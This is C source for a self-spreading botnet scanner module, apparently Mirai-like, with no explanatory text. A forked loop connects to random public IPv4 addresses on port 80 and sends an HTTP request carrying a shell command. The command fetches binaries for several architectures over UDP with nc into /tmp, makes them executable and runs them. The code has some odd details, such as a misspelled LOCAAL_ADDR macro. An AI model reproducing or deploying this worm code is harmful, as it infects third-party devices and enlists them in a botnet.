#include "includes.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define SCANNER_MAX_CONNS 64
#define SCANNER_PORT 80

struct conn { int fd; ipv4_t dst; time_t last; };
static struct conn conns[SCANNER_MAX_CONNS];
static ipv4_t get_rand_ip(void);
static void do_connect(struct conn *);
static void do_close(struct conn *);

void scanner_init(void) {
    if (fork() == 0) {
        int i; for (i = 0; i < SCANNER_MAX_CONNS; i++) conns[i].fd = -1;
        while (TRUE) {
            fd_set fds; struct timeval tv; int mf = 0;
            FD_ZERO(&fds);
            for (i = 0; i < SCANNER_MAX_CONNS; i++)
                if (conns[i].fd != -1) { FD_SET(conns[i].fd, &fds); if (conns[i].fd > mf) mf = conns[i].fd; }
            tv.tv_sec = 1; tv.tv_usec = 0;
            select(mf + 1, &fds, NULL, NULL, &tv);
            time_t now = time(NULL);
            for (i = 0; i < SCANNER_MAX_CONNS; i++)
                if (conns[i].fd != -1 && now - conns[i].last > 10) do_close(&conns[i]);
            for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fds)) {
                    char buf[4096]; int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n <= 0) do_close(&conns[i]); else conns[i].last = now;
                }
            }
            for (i = 0; i < SCANNER_MAX_CONNS; i++)
                if (conns[i].fd == -1) { conns[i].dst = get_rand_ip(); do_connect(&conns[i]); break; }
            sleep(1);
        }
    }
}

static ipv4_t get_rand_ip(void) { ipv4_t a; while (TRUE) { a = rand_next(); uint8_t f = (a >> 24) & 0xFF; if (f >= 100 && f <= 223) break; } return a; }

static void do_connect(struct conn *c) {
    struct sockaddr_in addr; char p[1024]; ipv4_t seed = rand_next(), local = util_local_addr();
    c->fd = socket(AF_INET, SOCK_STREAM, 0); if (c->fd == -1) return;
    fcntl(c->fd, F_SETFL, O_NONBLOCK);
    addr.sin_family = AF_INET; addr.sin_addr.s_addr = c->dst; addr.sin_port = htons(SCANNER_PORT);
    if (connect(c->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
        ipv4_t seed = rand_next();
        snprintf(p, sizeof(p),
            "GET / HTTP/1.1\r\nHost: %d.%d.%d.%d\r\n\r\n"
            "cd /tmp;for arch in arm mips mpsl x86 arm7 x86_64 ppc spc;do rm -f axis.$arch;for c in 0 1 2 3 4 5 6 7;do printf '\\040\\000\\000$arch' | nc -u -w1 %d.%d.%d.%d 49153 >> axis.$arch;done;chmod +x axis.$arch;done;for arch in arm mips mpsl x86 arm7 x86_64 ppc spc;do test -s axis.$arch && ./axis.$arch & done&",
            (c->dst >> 24) & 0xFF, (c->dst >> 16) & 0xFF, (c->dst >> 8) & 0xFF, c->dst & 0xFF,
            LOCAAL_ADDR(seed), LOCAAL_ADDR_1(seed), LOCAAL_ADDR_2(seed), LOCAAL_ADDR_3(seed));
        send(c->fd, p, strlen(p), 0); c->last = time(NULL);
    } else { close(c->fd); c->fd = -1; }
}

static void do_close(struct conn *c) { if (c->fd != -1) { close(c->fd); c->fd = -1; } }

#endif
